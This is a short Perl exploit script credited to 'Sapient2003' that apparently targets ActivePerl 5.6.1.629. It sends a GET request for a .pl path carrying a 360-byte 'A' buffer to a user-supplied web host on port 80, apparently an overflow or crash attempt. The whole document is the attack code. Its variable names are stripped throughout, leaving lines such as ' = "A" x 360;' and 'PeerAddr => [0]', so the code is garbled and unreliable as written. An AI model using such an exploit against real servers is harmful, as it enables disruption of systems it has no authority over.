#!/usr/bin/perl -w

use IO::Socket;

 = "ActivePerl 5.6.1.629";

unless (@ARGV == 1) {
  print "\n Exploit by Sapient2003\n";
  die "usage: -bash <host to exploit>\n";
}
print "\n Exploit by Sapient2003\n";

 = "A" x 360;
 = "GET /.pl HTTP/1.0\n\n";

 = IO::Socket::INET->new(
        PeerAddr => [0],
        PeerPort => 80,
        Proto    => "tcp",
) or die "Can't find host [0]\n";
print  ;
print "Attempted to exploit [0]...\n";
close();
